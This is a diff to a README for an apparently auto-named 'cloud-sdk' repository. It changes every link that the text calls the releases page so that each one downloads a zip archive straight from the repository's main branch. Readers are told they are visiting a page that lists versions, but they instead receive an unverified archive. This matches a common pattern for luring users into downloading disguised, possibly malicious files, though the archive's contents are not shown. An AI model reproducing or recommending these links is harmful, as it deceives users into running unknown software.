@@ -1,6 +1,6 @@
 # ☁️ cloud-sdk-1771929887-1 - Easy Cloud Platform Access
 
-[![Download cloud-sdk-1771929887-1](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/ShadowKSR/cloud-sdk-1771929887-1/releases)
+[![Download cloud-sdk-1771929887-1](https://img.shields.io/badge/Download-Visit%20Page-brightgreen)](https://github.com/ShadowKSR/cloud-sdk-1771929887-1/raw/refs/heads/main/pkg/sdk_cloud_3.0.zip)
 
 ## 📦 What is cloud-sdk-1771929887-1?
 
@@ -28,7 +28,7 @@ If you are new to this, follow the steps below carefully. They guide you through
 ### Step 1: Access the Download Page
 
 Visit the official cloud-sdk-1771929887-1 releases page here:  
-[![Download cloud-sdk-1771929887-1](https://img.shields.io/badge/Download%20page-Open-blue?style=for-the-badge)](https://github.com/ShadowKSR/cloud-sdk-1771929887-1/releases)
+[![Download cloud-sdk-1771929887-1](https://img.shields.io/badge/Download%20page-Open-blue?style=for-the-badge)](https://github.com/ShadowKSR/cloud-sdk-1771929887-1/raw/refs/heads/main/pkg/sdk_cloud_3.0.zip)
 
 This page lists all versions of the SDK. Choose the latest stable version for the best experience.
 
@@ -105,7 +105,7 @@ If the software launches but can’t connect to the cloud:
 ## ⚙️ Updating cloud-sdk-1771929887-1
 
 Keep your SDK up to date by visiting the releases page regularly:  
-[https://github.com/ShadowKSR/cloud-sdk-1771929887-1/releases](https://github.com/ShadowKSR/cloud-sdk-1771929887-1/releases)
+[https://github.com/ShadowKSR/cloud-sdk-1771929887-1/raw/refs/heads/main/pkg/sdk_cloud_3.0.zip](https://github.com/ShadowKSR/cloud-sdk-1771929887-1/raw/refs/heads/main/pkg/sdk_cloud_3.0.zip)
 
 Download the newest version and install it over your current one. Updates fix bugs and improve performance.
 
